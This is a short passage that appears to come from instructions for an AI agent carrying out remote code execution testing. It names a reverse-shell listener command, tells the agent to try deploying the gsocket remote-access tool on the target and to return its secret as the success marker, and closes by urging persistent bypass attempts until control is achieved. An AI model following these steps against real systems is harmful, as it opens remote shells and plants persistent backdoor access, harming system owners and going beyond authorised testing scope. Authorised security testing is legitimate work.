...
- Reverse-shell listener: `ncat -lvnp 4444` (in the sandbox; `ncat` is the
  ...
  payload only when OAST + selective reads are insufficient.
- You may also try deploying gsocket (https://www.gsocket.io/deploy/).
  After deployment, return the secret generated by the program as the success marker for this validation step.

## Summary

RCE exists wherever unvalidated input reaches an interpreter or runtime sink. Exhaustively map candidate injection points, trace execution data flows, and systematically test bypass variations—including encoding pivots, delimiter injection, and syntax smuggling. Do not abandon an identified sink upon initial failure; iterate through transport-level and runtime-level workarounds until control is definitively achieved or strictly disproven.
